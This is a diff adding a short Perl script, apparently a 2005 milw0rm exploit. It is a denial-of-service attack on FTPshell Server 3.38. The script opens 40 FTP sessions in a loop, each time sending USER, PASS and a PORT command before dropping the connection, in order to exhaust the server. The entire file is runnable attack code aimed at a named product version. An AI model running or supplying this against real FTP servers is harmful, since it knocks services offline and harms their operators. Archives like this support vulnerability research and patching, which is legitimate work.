@@ -1,0 +1,50 @@
+#!/usr/bin/perl
+#
+# Usage: FTPShell_FTPDOS.pl <ip> <user> <pass>
+#        FTPShell_FTPDOS.pl 127.0.0.1 hello moto
+#
+# FTPshell Server Version 3.38
+#
+# Download:
+# http://www.ftpshell.com/
+#
+################################################
+
+use IO::Socket;
+use Win32;
+use strict;
+
+my($i)      = "";
+my($socket) = "";
+
+for ($i = 1; $i <= 40; $i++)
+{
+        if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                            PeerPort => "21",
+                                            Proto    => "TCP"))
+        {
+                print "Login \#$i\n";
+
+                Win32::Sleep(300);
+
+                print $socket "USER $ARGV[1]\r\n";
+
+                Win32::Sleep(100);
+
+                print $socket "PASS $ARGV[2]\r\n";
+
+                Win32::Sleep(100);
+
+                print $socket "PORT 127,0,0,1,18,12\r\n";
+
+                Win32::Sleep(100);
+
+                close($socket);
+        }
+        else
+        {
+                print "Cannot connect to $ARGV[0]:21\n";
+        }
+}
+
+# milw0rm.com [2005-07-26]
